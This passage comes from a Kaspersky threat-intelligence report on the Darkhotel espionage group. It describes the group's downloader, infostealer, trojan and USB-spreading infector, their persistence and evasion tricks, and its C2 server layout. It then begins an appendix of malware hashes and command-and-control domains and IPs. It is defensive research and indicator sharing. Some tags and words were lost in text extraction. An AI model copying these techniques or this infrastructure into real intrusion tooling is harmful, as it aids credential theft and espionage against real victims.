modified over time. These tools are dropped by hotel installers spoofing legiti-
mate software installers, bound within torrent bundles, or dropped by exploits or
hypertext linked from spear-phishing emails.
More advanced tools, like the keylogger decribed above, are later downloaded to
the victim system by one of these implants. In a recent case, word docs embed-
ded with 0-day flash swf files either dropped these backdoors or downloaded and
executed backdoors from remote web servers. These tools pull down the keylog-
ger, steal information from the system, or download other tools.
 small downloader
 information stealer
 Trojan
 dropper and self
injector
 selective infector
The most interesting behaviors of these components include
 highly unusual conditional 180 day command and control communications
   delay
 self
kill routines when the system default codepage is set to Korean
 enhanced Microsoft IntelliForm authentication theft handling
 infostealer module Internet Explorer, Firefox, and Chrome support
 campaign or stage ID maintenance
 virtual machine execution sensitivity
 selective viral infection routines to focus the spread of malware within organi-
   zations
 signed malcode (previously noted)
Small Downloader
This module is quite small (27Kb) and comes as a part of WinRar SFX file that drops
and starts the module from %APPDATA%\Microsoft\Crypto\DES64v7\msieckc.exe.
This module is designed to update malicious components through recurring checks
at the C&C server. It is also capable of removing some older components, the names
of which are hardcoded in the body of the malware. The module adds autorun registry
settings to enable an automatic start during system boot.
TLP: Green
               For any inquiries, please contact intelreports@kaspersky.com
One of the most interesting functions of this executable is its unusual delay and
persistence. If a special file exists on the system, the module will not start calling
back to C&C server until the special file is 180 days old. So, if some other critical
malicious component was removed during this period, current module backs up
and restores access to the system within 6 months.
The component gathers system information and sends it to the Darkhotel com-
mand and control servers as detailed in Appendix D.
Information Stealer
This module is relatively large (455Kb) and comes as a part of a WinRar SFX file
that drops and starts the module from %APPDATA%\Microsoft\Display\DmaUp3.
exe. The main purpose of the module is to collect various secrets stored on a lo-
cal system and upload them to Darkhotel command and control servers:
   Cached passwords from Internet Explorer 6/7/8/9 (Windows Protected Storage)
   Mozilla Firefox stored secrets (<12.0)
   Chrome stored secrets
   Gmail Notifier credentials
   Intelliform
handled data and credentials:
     
 Twitter
     
 Facebook
     
 Yandex
     
 Qip
     
 Nifty
     
 Mail.ru
     
 126.com email
     
 Zapak
     
 Lavabit (encrypted email service now shut down)
     
 Bigstring
     
 Gmx
     
 Sohu
     
 Zoho
     
 Sina
     
 Care2
     
 Mail.com
TLP: Green
                For any inquiries, please contact intelreports@kaspersky.com
                                                                                  17
 Fastmail
 Inbox
 Gawab (middle
eastern email service)
 163.com
 Lycos
 Lycos mail
 Aol login
 Yahoo! logins
 Yahoo! Japan logins
 Microsoft Live logins
 Google login credentials
This module is designed to terminate itself on Windows with the system de-
fault codepage set to Korean.
Trojan.Win32.Karba.e
This malware is 220Kb in size. It was built as MFC framework application with a
lot of extra calls that should have complicated the analysis of the sample. It mim-
ics a GUI desktop application but it does not create any visible windows or dialogs
to interact with local users. The Trojan collects data about the system and anti
malware software installed on it, and uploads that data to Darkhotel command
and control servers. More technical details are provided in Appendix D.
Trojan-Dropper & Injector (infected legitimate files)
This malware is 63kb in size. It is bound to a variety of other software packages
that vary in name, but the host package is consistently detected as 
Virus.Win32.
Pioneer.dx
. It drops the igfxext.exe 
selective infector
 component to disk and
runs it.
TLP: Green
               For any inquiries, please contact intelreports@kaspersky.com
Selective Infector
This component is a virus, and is used to selectively infiltrate into other comput-
ers via USB or network shares.
First, the virus retrieves all available disks and starting from disk number 4 (D:\)
to disk number 20 (Z:\), finds executable files and infects them. The code simply
brute forces the list of mapped removable drives.
During its infection routine, the infector changes the entrypoint of executable
files, creates an .rdat section, and inserts a small loader in the section, then puts
its main payload in the overlay. Every infected file has functionality described in
Trojan
Dropper & Injector section, so it can collect information about the comput-
er, send it to the C2 and download other Darkhotel components as commanded.
Observed downloaded components are signed with a familiar expired certificate
from www.esupplychain.com.tw, issued by Cybertrust SureServer CA.
Again, further technical details are provided in Appendix D.
Campaign Codes
Almost every backdoor in this set maintains an internal campaign code or id, used
in initial c2 communications as described above. Some IDs appear to be related to
geographic interests, others do not seem obvious. We gathered a list of Darkhotel
campaign IDs shown below. Internal IDs and c2 resources overlap across these com-
ponents, there is no pattern of distribution according to connectback resources. The
most common id is 
DEXT87
                   DEXT87                                 NKstep2-auto
                 step2-auto                              PANA(AMB)-auto
                dome1-auto                                PANA#MERA
                step2-down                                SOYA#2-auto
                  Java5.22                                step2-down-u
               C@RNUL-auto                            (ULT)Q5SS@E.S-down
                dome-down                                   VER1.5.1
                M1Q84K3H                                     VICTORY
              NKEX#V1.Q-auto                               WINM#V1.Q
TLP: Green
                For any inquiries, please contact intelreports@kaspersky.com
                                                                                  19
Infrastructure and Victims
This infrastructure team appears to employ a lesser skillset than top notch
campaigns, maintaining weak server configurations with limited monitoring and
defensive reactions, and making some simple mistakes. However, they are ef-
fective at maintaining a fully available infrastructure to support new and existing
infections.
Overall, victims in our sinkhole logs and KSN data were found across the globe,
with the majority in Japan, Taiwan, China, Russia, Korea and Hong Kong.
Sinkhole Domains
The following C&C domains have been sinkholed and redirected to the Kaspersky
Sinkhole Server
   42world.net                                  jpnspts.biz
   academyhouse.us                              jpqueen.biz
   adobeplugs.net                               mechanicalcomfort.net
   amanity50.biz                                micromacs.org
   autocashhh.hostmefree.org                    ncnbroadcasting.reportinside.net
   autochecker.myftp.biz                        neao.biz
   autoshop.hostmefree.org                      private.neao.biz
   autoupdatfreeee.coolwwweb.com                reportinside.net
   checkingvirusscan.com                        self
-makeups.com
   dailyissue.net                               self-
makingups.com
   dailypatch
-rnr2008.net                      sourcecodecenter.org
   fenraw.northgeremy.info                      support
forum.org
   generalemountina.com                         updatewifis.dyndns
-wiki.com
   goathoney.biz
TLP: Green
               For any inquiries, please contact intelreports@kaspersky.com
Victim Locations - KSN and Sinkhole Data
KSN Data
Our Kaspersky Security Network detected Darkhotel infections across thousands
of machines, mostly related to the Darkhotel p2p campaigns. These geolocation
estimates probably provide the most accurate picture of where Darkhotel activity
is occurring.
TLP: Green
              For any inquiries, please contact intelreports@kaspersky.com
                                                                                   21
Here is a pie chart to better visualize the proportions of attack activity throughout
the world. As you can see, over 90% of it occurs in the top five countries: Japan,
followed by Taiwan, China, Russia and Korea.
TLP: Green
                For any inquiries, please contact intelreports@kaspersky.com
Sinkhole Data
Because the operators very actively build up new command and control serv-
ers, it is difficult to sinkhole enough domains to get an accurate overall picture
of victim system location based on this data. Also, many researcher systems are
connected to the sinkholed domains. However, this graph of current sinkhole
callbacks presents a low confidence distribution of victim geolocation, with India,
Japan, Ireland, Korea, China and Taiwan in the top slots. Removing India and
Ireland, the set more closely matches our KSN data.
Available ddrlog Victim Data
Many of these c2s maintain a common directory path that serves a ddrlog. The
ddrlogs appear to maintain callback data that the attackers want to set aside in
error logs. Many of the callback URLs have errors, many are from unwanted IP
ranges, and others are clearly unwanted researcher sandbox system callbacks.
A description of the detailed connectback URL values and their xor/base64
encoding scheme is included in the 
Interesting Malware Trojan.Win32.Karba.e
technical notes in Appendix D.
The Darkhotel c2 maintain these directory structures to store and serve ddrlog
content:
 /bin/error/ddrlog
 /patch/error/ddrlog
TLP: Green
               For any inquiries, please contact intelreports@kaspersky.com
                                                                                     23
The following structures appear to be common across servers, but do not pro-
duce ddrlog and do not maintain an /error/ directory:
 /u2/
 /u3/
 /patch2/
 /major/
 inor/
 /asp/
 /update3/
Two ddrlog files report entries starting January 1, 2009 at 9:16 a.m.
 autozone.000space.com
 genuinsman.phpnet.us
All of the logs maintain a significant number of entries, almost 50,000, with a
simple stamp 
 or 
. Those records are formatted in the following manner:
 2009.01.01 09:16:00 150.70.xxx.xx >
                                   
 2009.01.01 09:16:33 150.70.xxx.xx >
                                   
 2009.01.01 09:14:52 220.108.x.xxx >
                                   
 2009.01.01 09:16:04 112.70.xx.xx >
                                  
Only 120 IP addresses perform the 
 checkin, and 90% of these are from the
range 150.70.97.x. This entire range is owned by Trend Micro in Tokyo, JP.
A handful of the remaining addresses, like 222.150.70.228, appear to come
from other ranges owned by Trend Micro in JP. One outlier comes from an El Sal-
vadoran ISP, and another is connected to a Japanese ISP. Approximately 20,000
IP addresses perform the 
 checkin.
Other ddrlogs may include 
 tags as well.
The 
 tag labels unwanted checkins from untargeted locations, like Hungary
and Italy. The 
 tag labels unwanted checkins from Trend Micro IP ranges.
The 
 tag labels unwanted checkins from a variety of ranges, but includes odd
IP like the loopback address, 127.0.0.1, clearly an error.
Entries in these logs include callback URLs that have spaces and unusual charac-
ters that do not conform to the required base64 character dictionary.
TLP: Green
                  For any inquiries, please contact intelreports@kaspersky.com
C2 Communications and Structure
Typical main page:
For begatrendstone.com, we have the following directory structure:
/bin
read_i.php (main C&C script)
    
login.php (unknown, replies 
Wrong ID()
/bin/error (error logs stored here)
     
ddrlog
/bin/tmp
/bin/SElhxxwiN3pxxiAPxxc9
      -all.gif
      /i
      - encrypted stolen victim system content
      /L
      /f
For auto2116.phpnet.us, we have the following directory structure:
/patch
chkupdate.php (main command and control script)
/patch/error
    
ddrlog
The group encrypts victim data on their servers with single user/passkey combi-
nations across multiple victims. When an unauthorized user attempts to access a
Darkhotel web interface for victim management without the correct passkey, the
html page and table layout renders properly, but all the data values on the page
are returned as garbled ciphertext.
TLP: Green
               For any inquiries, please contact intelreports@kaspersky.com
                                                                                  25
Victim Management
New victim systems appear to be systematically vetted. The attackers maintain
web interface to vet these new victim systems. The attackers first and foremost
list and sort victim systems according to their latest c2 check
in. Collected data
probably is presented in order of importance:
 user
s logon name
 system CPU and OS
Ping sec
, or how far the victim system is from the c2
, or the process that the attackers
 dll code executes within
 Vac: ??
 system LAN IP
 network WAN IP
Here is an example of one of these web pages:
TLP: Green
               For any inquiries, please contact intelreports@kaspersky.com
Researcher Activity
Clearly, some automated analysis activity involving researchers
 sandbox tools
are filling up these logs. From June 2013 to April 2014 (approximately an 11
month period), in only 15 ddrlog files, we observe almost 7,000 connections from
research sandbox systems. The network connections provide a1= through a3=
values identifying a QEMU based sandbox, all sourced from only 485 WAN IP ad-
dresses. Under 30 lan IPs are recorded, all in the same 172.16.2.14
126 range.
This system(s) uses a 
Dave
 user account and 
HOME
D5F0AC
 Windows
system name.
These characteristics correspond with network activity generated by GFI Soft-
ware
CWsandbox
 tools, now owned by 
ThreatTrack Security
TLP: Green
              For any inquiries, please contact intelreports@kaspersky.com
                                                                                  27
Conclusions
For the past seven years, a strong threat actor named Darkhotel, also known as
Tapaoux, has carried out a number of successful attacks against a wide range of
victims from around the world. It employs methods and techniques which go well
beyond typical cybercriminal behavior.
The Darkhotel crew
s skillset allows it to launch interesting cryptographical at-
tacks, for instance factoring 512 bit RSA keys. Its use of 0-days is another indica-
tor of a strong threat actor.
The targeting of top executives from various large companies around the world
during their stay at certain 
Dark Hotels
 is one of the most interesting aspects of
this operation. The exact method of targeting is still unknown - for instance, why
some people are targeted while others are not. The fact that most of the time the
victims are top executives indicates the attackers have knowledge of their victims
whereabouts, including name and place of stay. This paints a dark, dangerous
web in which unsuspecting travelers can easily fall. While the exact reason why
some hotels function as an attacker vector are unknown, certain suspicions ex-
ist, indicating possibly a much larger compromise. We are still investigating this
aspect of the operation and will publish more information in the future.
A further interesting trait is the deployment of multiple types of campaigns, both
targeted and botnet. This is becoming more and more common on the APT scene,
where targeted attacks are used to compromise high profile victims and botnet
style operations are used for massive surveillance or performing other tasks such
as launching DDoS attacks on hostile parties or simply upgrading victims to more
sophisticated espionage tools.
We expect the Darkhotel crew to continue their activities against DIB, Govern-
ment and NGO sectors. The appendix released with this paper provides technical
indicators of compromise which should help victims identify the malicious traffic
and enable targets to protect themselves better against attack.
TLP: Green
               For any inquiries, please contact intelreports@kaspersky.com
Kaspersky Lab HQ
39A/3 Leningradskoe Shosse
Moscow, 125212
Russian Federation
more contact details
Tel:
+7-495-797-8700
Fax:
+7-495-797-8709
E-mail:
 info@kaspersky.com
Website:
 www.kaspersky.com
Darkhotel
Indicators
of Compromise
For more information, contact intelreports@kaspersky.com
Version 1.0
November, 2014
Global Research and Analysis Team
Contents
Appendix A - related md5s .....................................................................................3
   Downloaders, injectors, infostealers ...............................................................3
Appendix B. Fully Qualified Domain Names, Command and Control ................ 12
Appendix C. Code-signing certificates ................................................................ 17
Appendix D. Malcode Technical Notes ............................................................... 58
   Small Downloader .......................................................................................... 58
       Technical Details....................................................................................... 58
   Information Stealer......................................................................................... 60
       Technical Details....................................................................................... 60
   Trojan.Win32.Karba.e..................................................................................... 64
       Technical Notes......................................................................................... 64
   Selective Infector............................................................................................ 67
       Technical Notes......................................................................................... 67
   Trojan-Dropper & Injector (infected legitimate files)..................................... 67
       Technical Notes......................................................................................... 67
   Enhanced Keyloggers and Development...................................................... 68
       Technical Notes......................................................................................... 68
   Keylogger Code............................................................................................... 68
Appendix E. Parallel and Previous Research...................................................... 73
TLP: Green
                          For any inquiries, please contact intelreports@kaspersky.com
                                                                            3
Appendix A - related md5s
Downloaders, injectors, infostealers
000c907d39924de62b5891f8d0e03116
00ca5c0558dc9eba1a8a4dd639e74899
0183bac55ebfad2850a360d6cd93d941
0396f7af9842dc5c8c0df1a44c01068c
03a611a8c2f84e26c7b089d3f1640687
03d35ef3fdf353fe4dc65f3d11137172
043d308bfda76e35122567cf933e1b2a
04461ee7c724b6805820df79e343aa49
05059c5a5e388e36eed09a9f8093db92
061e3d50125dc78c86302b7cfa7e4935
06206fe97fed0f338fd02cb39ed63174
08a41624e624d8fb26eeed7a3b1f5009
08b04d6ef94d2764bfafd1457eb0d2a0
08e08522066a8cd7b494ca64de46d4f7
091e4364f50addd6c849f4399a771409
09e7b0ecd5530b8e87190dee0f362e13
0bd1677c0691c8a3c7327bf93b0a9e59
0bfbd26a1a6e3349606d37a8ece04627
0bfc8e7fa0b026a8bf51bbea3d766890
0cbd04c5432b6bfb29921177749f3015
0d75157d3f7fbf13264df3f8a18b3905
0fe3daf9e8b69255e592c8af97d24649
101244381e0590adecf5f2b18d1b6042
11e85a6e127802204561b6996d4224b6
121a9ea93f3ed16a1b191187b16b7592
12b88e36170472413a49ae71b1ac9a33
12df4869b3a885d71c8e871f1a1b0fde
1300244219cb756df01536692edebdbb
131c5f8e98605f9d8074ca02fd1b9c34
131c625a92dc721c5d4dae3fb65591fc
140b27db7d156d6a63281e1f6fc6075d
15097b11e3898cb0be995e44a79431f2
151115ddf1cd4b474a9106cfebcb82e4
16139ce9025274a388a4281fef65049e
16e378d5f0a15fbd521b087c0951a2ab
173abb95e39f03415cd95b76e8a2f58f
TLP: Green
       For any inquiries, please contact intelreports@kaspersky.com
1743dafa776677e232d20506858d9a4e
175aa0d1bdebfa60de29b90ab2c62189
178f7fe2d3a2bda46c0e78f679ca5a62
18527b303c0afe91f5ae86d34b52eb29
18527b303c0afe91f5ae86d34b52eb29
1971ee25847d246116835c7157cf7f89
1a2e52e5ac18cfe091bb3ac1cb38f050
1b0c2c6c19404112306a78ecf366f90b
1ec49ae6d535bfb3789d498f4fd0224f
1ee6676e122fcd22e80b6ae0dc40c979
1ef21e634f9779280710e87ff17a83af
1f29ec5ab8a7c2ccda21576f29cbb13b
1fcaa239cf4d627078179f6de299f320
2024679f61cf9ab60342eca58360737f
216088053dac46fcd95938568c469fa6
21792583ab4a7080ceaf2c31731b883e
21ba9d9d914d8140c1e34030e84213f4
236df260f858f9a6ca056bcdec6f754f
25102d64dbc9b6495c5713f3178dd7f1
26b34d3df337407c7618f74e9a82eb9f
26b7b5d019d7500efdb866f1d20d2000
275e0786b6294ffd05f45df435df842c
27db26077f849e26ba89fcafd2f0db92
27f2f32ba938b1747f28ffdd2f56c691
2802c47b48cced7f1f027f3b278d6bb3
28b1569109fcae8cfcdcfbe9c4431b66
2aac9d340620da09d96929ba570978c4
2b443cc331fec486a6ccbcfcd92e76a4
2be3a8dd0059e291022ad32bbce0e5d1
31e0788c9c2e16db1ae1002f0dbc837e
3260c9f881eb815b7ef3f5f295fc5174
326b44e73fccece89326fd865da61f7f
35a15355c96be225507ebed1ec434d57
378177ddc1fd7d213b79c033da26327d
38b919f37501fc3d54f8f1b956448a92
3961CAB50C32E8F32FE45836B9715CE5
3961cab50c32e8f32fe45836b9715ce5
39fc4a3ea44ab9822ed5e77808803727
3f39c6dea5311167cc7ff62befd4ea7e
41b816289a6a639f7f2a72b6c9e6a695
TLP: Green
       For any inquiries, please contact intelreports@kaspersky.com
                                                                            5
41b816289a6a639f7f2a72b6c9e6a695
428eb3305d4d4c9a8831e1d54160ed65
42a3bb917778454fa96034ad4fb17832
42b9fea2ec56a90cefeecee3c84aade0
436b853cbc87ba3a99131ce2d64a512d
44300d48fccd5aaf27f4c863421c0d47
44e520bec8a3e35f6f6ad52e97911e14
45a4c8c01ec94e1db83b86e05dc9e851
45b94e90cab94d9f873478151a80703d
48888cca68db492c87892524146e8ae3
4d275adbd318f182fa0ec0275cf217b4
4d840625c5ca9a4f1cbd35d4b1ca2452
4f377a8344baa76afe9103ca843e315f
4fc1b3dbf9dc44278f990d57913d96f6
50ac685d25033962e04adc92c8e70785
51c1b9b3df00de5e08c4aa3a2b864a54
51d3e2bd306495de50bfd0f2f4e19ae9
51eaec282b845bc54dbd4fbce5bb09d8
522cd120fa4b1517a60fcf8be3e71ff4
53dc9866fd77fe4933eea3c08666c7bb
55b125da1310d2b37f18ea4e2ae8192b
5607a3ccdaf748fd5cd2d1bec4a771bd
57099403f28d2ce79cba11469c8be971
57dfd2ec5401d9a3d68b4d125e1eb308
5b7b8d3b844b4dbc22875a2a6866a862
5bbdb09ec6ec333a20de74fd430b2bc2
5dee5ad9f12f89fcf9fdcf07ebab3e5e
5f05acd53cfd91fb4dba3660ad1e3add
60af79fb0bd2c9f33375035609c931cb
63409ddbd5316bae8e956595c81121ab
65460ec31dce97c456991ba5215d9c43
686738eb5bb8027c524303751117e8a9
687b8d2112f25e330820143ede7fedce
68ca3d3fc4901d1af8d3adc3170af6ad
697e77c5ef4cf91d5a84b0b3f0617887
6a37ba1bac5fb990fbd1c34effcb0b9d
6bb1a12416c92f5ef12947e2dc5748f9
6ce73a81f0e4a41ffcf669e6ace29db6
6de1b481ae52fbacd7db84789a081b74
6f1a828a2490099a3ce9f873823cce7c
TLP: Green
       For any inquiries, please contact intelreports@kaspersky.com
70a0412d19d55bcab72e76c984694215
72869fc63d0ba875dfc539d2bcd48e4d
74d403244db05f7c294ca0777a9f7a9e
76dd289fa3dd8f36972593a006b771cc
77669d11c3248a6553d3c15cd1d8a60e
7bab3a69ab65b90e47d5cc0724531914
7c2eeda3bb66b2c29aa425ba74c780c3
7d304a9cdcda75b1cb9537618f5ed398
804dceb3fa2b9bcf65595109b9465bbc
82ab0b8246c6677f9866b17794b72e2d
864cd4a59215a7db2740dfbe4a648053
86b18e99072ba72d5d36bce9a00fc052
89de19ff50dd58eda2b136b65feb3fb0
8c01d9a2c13ebc8dc32956336a6bc4f5
8f7a7d003cafa56c63e9402f553f9521
90f26c5c4b3c592352fcbddf41dc18aa
910a1f150a5de21f377cf771ed53261f
912a8c7cf1ad78cd4543bfb594c7db58
9a2f2291686080a29f4c68bdc530887f
9bc355cbb5473f4f248f3e2be028ec0b
9c5cd8f4a5988acae6c2e2dce563446a
9ccc7ce97f8ee0cd44d607e688b99eca
9eeae870f22350694eb2e7a4852dbb7d
9f08b8182c987181fe3f3906f7463eac
a44577e8c77ef3c30749fe6ec2bb55a5
a49780f2da2067dd904135fad3af8a90
a71f240abb41eb1e37ff240613d14277
a7b226c220e1282320fca291a5100f93
a8151939085ce837b3a7deec58efa7b4
a9faa01c7cf7150054600fc2ab63e4b6
aaeb3b0651720a3f37a0c2f57c92429c
abdcde9cd1f9135e412f7bb0a9cafbc9
ad0f9ba1a355c5e8048c476736c90217
af26f60a80171c4337117133f1c2ba5f
b07f6065011621c569fc2decd27056df
b1048d7d2464f27a19b2adbf310158b1
b2b29dcb1251c8b1c380f00834297857
b4cbafc20d19b06a4ab670129a3ae5aa
b6428851df75dc91bb46583b97d9a566
b7d1c3a03e92b24e9052e75ea381ea4a
TLP: Green
        For any inquiries, please contact intelreports@kaspersky.com
                                                                             7
ba87428a298f8acf258b2f4f814bd9b9
be7acfaf90c8fab44393345704dd2b69
bf700fa187cc22d591e1ec4e7442145a
c12fe91f0c39c2460ea304ffc250918d
c322e499729291451437d46c6f05b920
c49e6114fa3de4f823010e852d891896
c4ac4924544877cd100e53f1115c7df9
c5a9ec966196a03e53fd1869764d8507
c6cbb4ea6aabf4a58659cd13fa0b024f
c82ca00476d7e8532d055bf2cc2c9d59
c9f95fc8219750b7c47325a0b84e9373
cdd5afba31e91706412ba58fff2b4d31
cf95ab8c4cc222088de00dbb20374d69
d580cab0c05dd78215fd6252934c240f
d96babbde694df227a9af4b4b61483b3
da608f216594653a1716edd5734cd6e1
da6c390915639c853612cb665ac635f4
da6ed3cc582b4424c96b8ca73aaeb8ad
dd555740dcabb3dab3ea1fc71273e493
e070293d03cd3524e5db9fa4770589a5
e2ed43a6bbb72c927a4e083768e47254
e271ba345eada5f56471c5413acf52f9
e2b5c47156508a31b74a1f48e814fbe7
e579157fb503b5cbd59ce66f5381575c
e5a31be7717c12a3cf9a173428ac7c38
e62af1303ed81f1ae69a1c3b1f215d88
e65fddac2ada261adcdcde87b4dc5540
e9f89d406e32ca88c32ac22852c25841
ec4be1af573e5c55023b35bd02efe394
ed2119548aff161ff97d6837e6a08e84
ed9f539ddabdab8a88491ee38f638b64
ede6a67f7956686f753819c46f496c84
f1368a2e56ae66587847a1655265d3c9
f2231ce84551fbd8a57e75fb07d7f6c0
f47cdf5bfc7227382e18f8361249212b
f5d745e7a575b7aecae302623acd6277
f602fe96deb8615ab8cefbd959e1d438
f7084cf91278eb8176c815ec4e269851
f97ec1cc844914a9aa8dfa00d1ead62e
fe7efa9f0417ba001c058b513518f4cf
TLP: Green
        For any inquiries, please contact intelreports@kaspersky.com
a6f55037cb02911c5624e70a67704156
a131d12bc9ab7983b984c81e5e7e108e
0367f890595cf28c6c195dfabae53ba5
adab033d420206fcd2503643d443956e
cbbfa76cd5ed22a8c53f7f7d117923e5
93283599dbf3b2d47872dafae12afb21
d8137ded710d83e2339a97ee78494c34
93283599dbf3b2d47872dafae12afb21
06ac12b8c51aec71cefcf8a507d82ce4
3165b7472a9dd45cde49538561cba59f
043f0dcea6f6fbd1305571e6bf0fa78c
17c99725043fa1573fd650e57c3c75d3
0393036f35a7102a34fadfd77680b292
01cbd90ba5cf7e9595b208e4ca2d2d15
032a7c67332a3abf6da179ed265e6e04
23f7fe611ed2bd814bbdbfae457150b3
Example md5s of files detected with Kaspersky
s Virus.Win32.Pioneer.dx and
Symantec
s Infostealer.Nemim!inf:
00d8dd7ec8545134bdc2527b4190078b
01d09407d09355a821ba23ffb58ec40d
033d922f3f56f9ea7c976f31107e366a
043c84cef3e011e3dc731d643a205f4e
058efdf7d94c5da920a3c32cbadac2d0
0b6caacd4081d3b18e847a40c1b6a7f3
0b727001dfc90cc354bd2ccabe3c23a5
0d3e3fd44faa32e0d83b02c8b7cff49c
0d48f948b3c47d0c08e8ee026b8f4670
0fb91846ab9a4e9667c81154829f888b
1d399370e82b314ba20c21ff4ee82205
1f9d915d331f7e363c39108f41145c44
2431db868ebec1b967f5ad38abfd95c4
255f7842c6f07a6a1500a30fb4d27d54
35994a29128c08bed6f5d4aad28f102b
268d17f3763246ac27de7dc8024f23fa
40591b4ba82e0347b33098f6652640d6
4286ee45e9fcc2db3ddfad38426b7f50
4a0fa9be43cc84b5beb0b484227edfcb
4ce790e8438ed3a644984eb24452dd42
4e01e648645d041d52af9dbb09e442ef
TLP: Green
             For any inquiries, please contact intelreports@kaspersky.com
                                                                            9
4e8ea6bfacf9766f25af12fd63b16ce9
56217179283737f5c46c0a64ebe28a82
5cb91f0c3a1452176007dcc594ec02ce
5f05b4aff89a07dbac9914ae3cf1314f
611c4440aa2587f54702e7e58b7be75f
65f7b330bcc7aeebf8d84afa0b23bf02
67b96c2265e44ccfad708c9387570ab4
69fa0bfd74d0db4ad734b9944ea71ec3
6a79c842a6edca3460b0026cd16c3670
6acd47c45a3e031411af351b3be5f82e
6d3839c312976ba96e89ab6a243aef8f
6f7ec5ff103e4ee038a54816c6b9bc09
720af0fa1f2633b1b73c278a0a016559
729a2f6c7e95075ff36947bc5811a5d3
752c351778a8a18245f132dafdc54599
7a5256dda43cb459e99c0073f1e8f07b
7ad3b74bec51678622e21f57fb82e136
7f608ebfb9b1c81cb07eb8f26fd7647a
83f0f16fb86d6f67ca158d66c195884e
873f26caddfe1e9af18181d8f5f18368
8cdd3b6c577a17b698333337dd1cf3e0
8def236d23dea950d9b1b222cb9a463a
9305008e17b0805118a6a9bb45493441
965e7d4785d23ba6b6608c1245586eba
98b07144f4f5cc95348b39d6bfaeb56a
9978ced410a7dfd3a21ff59cbe1e4303
99a2cca89d044148aa3379cdf2e899fa
9a56bb6c022b3a2ab40d2b308ddf7015
9ba119cf7107d6f4f910447c90c4985d
9c3b06ab28840239cf1d0ecf4a45f6f4
9cdbd5955fc3bf6da5c00e0804b6d6a8
9d248e5cc726f2aa2fa4f06566a2d5b8
9eae89f27c8fbc5896fc7e540e4cfd4a
a07db3237b6bd9789b5f1126ea7b0195
a1467e57ea55030e45325d3987db9fca
a6b0406dff68430aac6a5b738731e7d0
a855b983f1f414461de0e813e2f72b24
ad35db962130becfac1de2f803a119ae
b164febacafd2ab33f203fc5faecd531
b44a988d18264735f39efc2001b29c63
TLP: Green
       For any inquiries, please contact intelreports@kaspersky.com
bc6a78142fa68af60e4edc06d28a2f28
c25d146b4cf05f7aaa9aebbe8d1563db
c34eb5aa60373119a03cfd90a5fea121
cdf5267225e6994b4670bf49ba50595a
d46204e579808d520affcc71a7d35cda
d73b08376c7cdf355d31b05a71c8c5ba
d8137ded710d83e2339a97ee78494c34
dd6c020e4a9c112c1776215b763f7525
e4fe6fa6e540cdb77807401aa2121858
e52b7d5391152da89b1db64060ba96ae
efda0c1d8593d3ab3a7c079b71a0f2bc
f7d0d5fc6b01a2e0f3a1c021bab49437
fcd2458376398b0be09eaa34f4f4d091
e8bfb82b0dd5cef46116d61f62c25060 
a47f6878da6480089c2ff3bdddbd7104
9f56c7f03370692f1d4761ddb848daf5
3e38b8ccd38682ad4ec1f0fcfc1fb16a
b5ab66687d53914a65447aacc8fb3e88
fda0320d1e28bc022e4d9e9aae544db4
29d76d34d8878f7ac703837ec774f26a
1bfc1b606fc8aa85e1094b01b08eafd6
64c4d56457516a646d10732f24214cf2
3e38b8ccd38682ad4ec1f0fcfc1fb16a
b5ab66687d53914a65447aacc8fb3e88
2600671b87dedbb50ca728285eb141b8
5b7b8d3b844b4dbc22875a2a6866a862
da608f216594653a1716edd5734cd6e1
cd1134ad11d21b4626e28cf5a9eb6f0c
53bc1a9d19aae7f783e019ec7613c366
ebe6b78006ecffe1511f46c86d16f4aa
c2d00fef0659640c1345967d2f554278
fe95141837ae86cb02a1bbf6a070cbb4
a0b0389eb9bbfe1839d3da7a1995da3f
822871578022c1292c9cb051cceedfe2
ca7e5ff32b729d0d61340911a01a479a
35cd5ca2e33400a67345b00ef6db3ff6
TLP: Green
       For any inquiries, please contact intelreports@kaspersky.com
                                                                           11
a45e0f8a404d846289f3a223253e94a9
8c3fc5e341d7df51ea9b781a55908e82
e8190374c3d962f5c2cbb5e30007216c
9a0963dbee2361fa9cebaa6e0e517774
397e492f1f65ed9a3c3edc9c7a938f01
TLP: Green
        For any inquiries, please contact intelreports@kaspersky.com
Appendix B. Fully Qualified Domain Names,
Command and Control
163pics.net                                autobicycle.20x.cc
163services.com                            autobicycle.freehostking.com
180.235.132.99                             autobicyyyyyy.50gigs.net
203.146.249.178                            autoblank.oni.cc
22283.bodis.com                            autobrown.gofreeserve.com
42world.net                                autocargo.100gbfreehost.com
59.188.31.24                               autocash.000php.com
88dafa.biz                                 autocashhh.hostmefree.org
academyhouse.us                            autocaze.crabdance.com
ackr.myvnc.com                             autocheck.000page.com
acrobatup.com                              autochecker.myftp.biz
adobearm.com                               autocracy.phpnet.us
adobeplugs.net                             autocrat.comuf.com
adoberegister.flashserv.net                autodoor.freebyte.us
adobeupdates.com                           autof888com.20x.cc
albasrostga.com                            autofseven.freei.me
alexa97.com0                               autogeremys.com
alphacranes.com                            autoinsurance.000space.com
alphastros.com                             autojob.whostas.com
amanity50.biz                              autoken.scienceontheweb.net
anti-wars.org                              autolace.twilightparadox.com
applyinfo.org                              automachine.servequake.com
auto2115.icr38.net                         automatic.waldennetworks.com
auto2116.phpnet.us                         automation.000a.biz
auto24col.info                             automation.icr38.net
autobaba.net84.net                         automobile.000a.biz
autoban.phpnet.us                          automobile.200gigs.com
autobicy.yaahosting.info                   automobile.freei.me
TLP: Green
              For any inquiries, please contact intelreports@kaspersky.com
                                                                              13
automobile.it.cx                        autoupdatefree.zoka.cc
automobile.megabyet.net                 autoupdatefreee.my5gigs.com
automobile.x4host.eu                    autoupdates.5gigs.net
automobiles.strangled.net               autoupdatfreeee.coolwwweb.com
automotive.20x.cc                       autoupgrade.awardspace.biz
autonomy.host22.com                     autovita.xtreemhost.com
autopapa.noads.biz                      autovonmanstein.x10.mx
autopara.oliwy.net                      autoworld.serveblog.net
autoparts.phpnet.us                     autozone.000space.com
autopatch.createandhost.com             begatrendsone.com
autopatch.verwalten.ch                  begatrials.com
autophile.00free.net                    bizannounce.com
autopilot.verwalten.ch                  blonze.createandhost.com
autoplant.byethost11.com                bluecat.biz.nf
autopsy.createandhost.com               bluemagazines.servegame.com
autoreviews.dyndns.info                 bokselpa.dasfree.com
autorico.ignorelist.com                 checkingvirusscan.com
autosadeo.000php.com                    clus89.crabdance.com
autosail.ns01.biz                       codec.servepics.com
autoshop.hostmefree.org                 control.wrizx.net
autostart.waldennetworks.com            cranseme.ignorelist.com
autotest.byethost4.com                  crazymand.twilightparadox.com
autotree.freebyte.us                    crendesting.strangled.net
autoup.eu.pn                            dailybread.waldennetworks.com
